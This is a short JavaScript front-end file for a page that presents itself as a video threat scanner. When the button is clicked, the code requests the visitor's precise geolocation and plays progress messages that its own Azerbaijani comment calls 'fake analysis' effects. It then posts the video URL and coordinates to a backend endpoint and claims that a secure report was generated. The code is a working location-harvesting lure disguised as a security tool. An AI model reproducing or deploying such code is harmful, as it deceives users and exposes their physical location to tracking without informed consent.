const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

analyzeButton.addEventListener('click', async () => {
  const videoUrl = videoUrlInput.value.trim();
  if (!videoUrl) return;

  progressBarContainer.style.display = 'block';
  progressBar.style.width = '5%';
  statusText.textContent = "Initializing system components...";

  let locationData = null;

  try {
    // Lokasiya icazəsi (arxa planda)
    if ("geolocation" in navigator) {
      await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            locationData = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            };
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });
    }

    // “Saxta analiz” effektləri
    statusText.textContent = "Scanning for potential threats...";
    await new Promise((r) => setTimeout(r, 1200));
    progressBar.style.width = '40%';

    statusText.textContent = "Analyzing network activity...";
    await new Promise((r) => setTimeout(r, 1200));
    progressBar.style.width = '70%';

    statusText.textContent = "Evaluating system security metrics...";
    await new Promise((r) => setTimeout(r, 1200));
    progressBar.style.width = '90%';

    await fetch('/api/send-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ videoUrl, location: locationData }),
    });

    progressBar.style.width = '100%';
    statusText.textContent = "✅ Threat analysis complete. Secure report generated.";

    setTimeout(() => {
      progressBarContainer.style.display = 'none';
      progressBar.style.width = '0%';
      videoUrlInput.value = '';
      statusText.textContent = '';
    }, 3000);
  } catch (err) {
    console.error(err);
    progressBar.style.width = '0%';
    progressBarContainer.style.display = 'none';
    statusText.textContent = "⚠️ Unexpected error occurred during scan.";
  }
});
